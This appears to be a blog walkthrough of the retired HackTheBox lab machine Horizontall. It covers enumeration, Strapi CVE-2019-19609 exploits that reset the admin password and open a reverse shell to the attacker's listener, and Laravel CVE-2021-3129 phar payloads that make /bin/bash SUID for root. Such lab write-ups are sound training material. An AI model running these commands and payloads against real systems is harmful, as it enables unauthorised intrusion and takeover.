---
layout: post
title: "HTB: Horizontall"
author: Andrew Cherney
date: 2023-02-17 19:55:05
tags: htb easy-box linux webapp cve
icon: "assets/icons/horizontall.png"
post_description: "This box is a great example of how much information can be leaked by basic scripts and services. A javascript file leaks a subdomain with an api, and then the login portal leaks the vulnerable version of strapi being run. To gain root there is a somewhat clever way of ssh tunneling to manipulate a vulnerable local service on the box."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Horizontall]
└──╼ $nmap -sC 10.10.11.105
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-17 20:26 CST
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http
|_http-title: horizontall
```

<h2>Port 80 - HTTP</h2>

{% include img_link src="/img/horizontall/front_page" alt="front_page" ext="png" trunc=500 %}

In looking around the javascript file **app.c68eb462.js** I find a reference to **http://api-prod.horizontall.htb/reviews** and I can now add <code>10.10.11.105 api-prod.horizontall.htb horizontall.htb</code> to my **/etc/hosts** file.

<h2>api-prod</h2>

{% include img_link src="/img/horizontall/api-prod_front" alt="front_page" ext="png" trunc=100 %}

![api-prod reviews](/img/horizontall/Horizontall_json_reviews.png)

There seems to be some uploaded json for reviews of a service/product here. I'll toss out a dirb to find anything else on this subdomain.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Horizontall]
└──╼ $dirb http://api-prod.horizontall.htb

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Feb 18 11:18:40 2023
URL_BASE: http://api-prod.horizontall.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://api-prod.horizontall.htb/ ----
+ http://api-prod.horizontall.htb/admin (CODE:200|SIZE:854)                                   
+ http://api-prod.horizontall.htb/Admin (CODE:200|SIZE:854)                                   
+ http://api-prod.horizontall.htb/ADMIN (CODE:200|SIZE:854)                                   
+ http://api-prod.horizontall.htb/favicon.ico (CODE:200|SIZE:1150)                            
+ http://api-prod.horizontall.htb/index.html (CODE:200|SIZE:413)                              
+ http://api-prod.horizontall.htb/reviews (CODE:200|SIZE:507)                                 
+ http://api-prod.horizontall.htb/robots.txt (CODE:200|SIZE:121)                              
+ http://api-prod.horizontall.htb/users (CODE:403|SIZE:60)  
```

<h1>User as strapi</h1>

<h2>CVE-2019-19609</h2>

Heading to that admin portal I am met with a strapi login screen. When searching for vulnerabilities on exploit-db the only versions with known exploits are **3.0.0-beta.17.4 and 3.0.0-beta.17.7** so I get to trying to find the strapi verison. 

![strapi version](/img/horizontall/Horizontall_version_strapi.png)

Bingo, we're on **beta.17.4** which means [this unauthenticated RCE](https://www.exploit-db.com/exploits/50239) should let me get a shell as www-data. In reading through the exploit it seems I could have gone to **http://api-prod.horizontall.htb/admin/init** to find out the strapi version. 

Unfortunately this exploit doesn't seem to give me RCE. On the up side it did reset the password of admin to **SuperStrongPassword1** and when I log in it gives me a jwt of:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjc2NzQ3NTg3LCJleHAiOjE2NzkzMzk1ODd9.O0y5CLqbmYKRIRg0KNy0BjKxELvdlGeQquP9pwnGgVY
```

Now in searching for other exploits I came across [this exploit using a jwt for RCE](https://github.com/diego-tella/CVE-2019-19609-EXPLOIT/blob/main/exploit.py). At the endpoint /admin/plugins/install there is a way to pipe commands through and bypass traditional authentication methods.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Horizontall]
└──╼ $python3 strapi_jwt_exploit.py -d api-prod.horizontall.htb -jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjc2NzQ3NTg3LCJleHAiOjE2NzkzMzk1ODd9.O0y5CLqbmYKRIRg0KNy0BjKxELvdlGeQquP9pwnGgVY -l 10.10.14.14 -p 7777
[+] Exploit for Remote Code Execution for strapi-3.0.0-beta.17.7 and earlier (CVE-2019-19609)
[+] Remember to start listening to the port 7777 to get a reverse shell
[+] Sending payload... Check if you got shell
[+] Payload sent. 
```

```
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Horizontall]
└──╼ $nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.105] 45220
/bin/sh: 0: can't access tty; job control turned off
$ 
```

<h1>Root</h1>

<h2>Laravel</h2>

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Horizontall]
└──╼ $nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.105] 45232
/bin/sh: 0: can't access tty; job control turned off
$ netstat -tunlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1862/node /usr/bin/ 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -             
```

I found that there is a service running on port 8000 of localhost. In curling that service I find out that it is Laravel v8 (PHP v7.4.18). In a cursory search of exploits I find [this CVE-2021-3129 exploit for versions <=8.4.2](https://github.com/ambionics/laravel-exploits). I'll set up an ssh key for the user strapi and use ssh tunneling to run exploits against this localhost service from my host machine. 

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Horizontall]
└──╼ $ssh strapi@10.10.11.105 -i key -L 8000:localhost:8000
```

I can then execute the payload towards my localhost:8000 and it will target the laravel service on the box. Then I can clone the phpggc repo and run the laravel exploit after generating my payload.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Horizontall/phpggc]
└──╼ $php -d'phar.readonly=0' ./phpggc --phar phar -o shell.phar --fast-destruct monolog/rce1 system id
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Horizontall/phpggc]
└──╼ $cd ..
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Horizontall]
└──╼ $python3 laravel_exploit.py http://localhost:8000/ phpggc/shell.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
uid=0(root) gid=0(root) groups=0(root)
--------------------------
+ Logs cleared
```

Well that is awfully convenient that laravel is running as root. Since this exploit is RCE I can have it change /bin/bash to be an SUID and get root. 

```bash
php -d'phar.readonly=0' ./phpggc --phar phar -o shell.phar --fast-destruct monolog/rce1 system "chmod u+s /bin/bash"
```

```bash
$ /bin/bash -p
bash-4.4# cat /root/root.txt
b83c0d741c44ab-----------------
```

